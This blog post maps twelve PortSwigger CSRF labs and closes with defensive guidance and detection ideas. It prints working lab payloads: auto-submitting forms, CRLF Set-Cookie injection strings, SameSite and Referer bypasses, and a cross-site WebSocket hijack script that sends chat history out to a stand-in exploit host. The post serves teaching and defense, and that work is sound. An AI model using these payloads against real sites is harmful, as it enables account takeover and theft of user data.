---
layout: post
title: "CSRF Is a State-Transition Bug - A Twelve-Lab Map"
date: 2026-06-14 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [csrf, portswigger, samesite, referer, websocket, browser-security]
related_posts:
  - csrf-tokens-do-not-prove-user-intent
  - xss-is-a-parser-boundary-problem
  - ssrf-is-a-network-position-bug
---

CSRF is usually introduced as "make the victim submit a form." That is accurate, but too small.

The better model is this:

**CSRF is a state-transition bug.** The attacker does not need to know the victim's cookie. They need the browser to attach it to a state-changing request that the server accepts as intentional.

The twelve PortSwigger CSRF labs are a compact map of where that acceptance logic fails: missing tokens, broken token validation, cookie-bound token mistakes, SameSite edge cases, Referer mistakes, and WebSocket handshakes.

## The map

| Lab group | Broken boundary | Core failure |
|-----------|-----------------|--------------|
| no defenses | no CSRF token | any auto-submitted form can change state |
| token validation | method, presence, session binding | token checks only happen in some branches |
| token-cookie binding | `csrfKey` or duplicated `csrf` cookie | attacker can choose the cookie state |
| SameSite Lax | top-level GET and new-cookie grace | browser still sends cookies in allowed cases |
| SameSite Strict | target-site gadgets and sibling domains | same-site is broader than same-origin |
| Referer | missing header or substring match | header presence is not origin proof |
| WebSocket | no handshake token | CSWSH can read authenticated chat history |

## Tokens fail when validation is conditional

The first lab is the baseline:

```html
<form method="POST" action="https://LAB/my-account/change-email">
  <input type="hidden" name="email" value="csrf1@example.net">
</form>
<script>document.forms[0].submit()</script>
```

The next labs are more interesting because there is a token, but the validation path is wrong.

If the token is only checked for POST, a GET version works. If the token is only checked when the parameter exists, deleting the parameter works. If the token is not bound to the user session, a token from the attacker's account works in the victim's request.

The rule is not "include a token field." The rule is "reject every state-changing request unless the token is valid for this session, action, method, and lifetime."

## Cookie-bound tokens can become attacker state

Two labs bind the token to a cookie that the attacker can influence.

In the `csrfKey` lab, a search feature reflects input into `Set-Cookie`, so the exploit first sets the victim's `csrfKey`:

```text
/?search=test%0d%0aSet-Cookie:%20csrfKey=<key>%3b%20SameSite=None%3b%20Secure
```

Then it submits the matching token from the attacker's account.

In the duplicated-cookie lab, the server only compares the body token with the cookie token. A fake pair is enough:

```html
<input type="hidden" name="csrf" value="fake-token">
<img src="https://LAB/?search=test%0d%0aSet-Cookie:%20csrf=fake-token%3b%20SameSite=None%3b%20Secure"
     onerror="document.forms[0].submit()">
```

If the attacker can set the state that the server trusts, the comparison is not a security control.

## SameSite is not authorization

SameSite is a browser cookie-delivery rule. It is valuable, but it is not a complete CSRF defense.

Default Lax cookies are sent on top-level GET navigations. If the server accepts method override, this is enough:

```html
<script>
document.location = "https://LAB/my-account/change-email?email=csrf7@example.net&_method=POST";
</script>
```

Strict cookies are stronger, but target-site gadgets can still matter. In the client-side redirect lab, the first request is cross-site, but the target page's JavaScript performs the second request from the target site:

```text
/post/comment/confirmation?postId=1/../../my-account/change-email?email=csrf8@example.net%26submit=1
```

The sibling-domain lab is the most useful boundary lesson. `cms-LAB.web-security-academy.net` is a sibling domain, not the same origin, but it is the same site. Reflected XSS there can open an authenticated WebSocket to `LAB.web-security-academy.net`:

```js
var ws = new WebSocket('wss://LAB/chat');
ws.onopen = function(){ ws.send('READY') };
ws.onmessage = function(event){
  fetch('https://EXPLOIT/collect?m=' + encodeURIComponent(event.data), {mode:'no-cors'});
};
```

The official route uses Collaborator for collection. I used the Academy exploit server access log instead, which was enough to capture the victim chat history and recover the login credential.

The cookie-refresh lab abuses the two-minute grace period for newly issued Lax cookies. A click opens `/social-login`, refreshing the session cookie, then submits the cross-site POST a few seconds later.

## Referer is a weak signal unless parsed strictly

Referer defenses fail in two common ways.

If a bad Referer is rejected but a missing Referer is accepted:

```html
<meta name="referrer" content="no-referrer">
```

If the server only checks whether the Referer string contains the target host, put that host in the exploit page query and force the browser to send the full URL:

```http
Referrer-Policy: unsafe-url
```

```html
<script>history.pushState("", "", "/?LAB.web-security-academy.net")</script>
```

Origin comparison must parse scheme, host, and port. A substring is not an origin.

## Defender notes

CSRF defense should be built around the state transition, not the incidental shape of one normal request:

- require a valid token for every state-changing request;
- bind tokens to server-side session, user, action, method, and lifetime;
- reject missing tokens;
- do not let GET change state;
- do not allow method override to bypass security semantics;
- do not bind CSRF to attacker-controlled cookies;
- use SameSite as defense in depth, not as the primary control;
- validate `Origin` and `Referer` fail-closed using parsed origins;
- protect WebSocket handshakes with Origin validation and/or one-time tokens;
- treat sibling domains as part of the same site risk surface.

Detection ideas:

- state-changing GET requests or `_method=POST` on account endpoints;
- successful sensitive requests with missing token or missing Referer;
- CRLF `Set-Cookie` injection patterns in reflected endpoints;
- `Sec-Fetch-Site: cross-site` on account-change requests;
- `/social-login` followed quickly by cross-site account changes;
- WebSocket chat handshakes from sibling origins followed by bulk history reads.

The durable lesson is that user intent has to be validated at the application boundary. Browser cookie behavior is only one input to that decision.
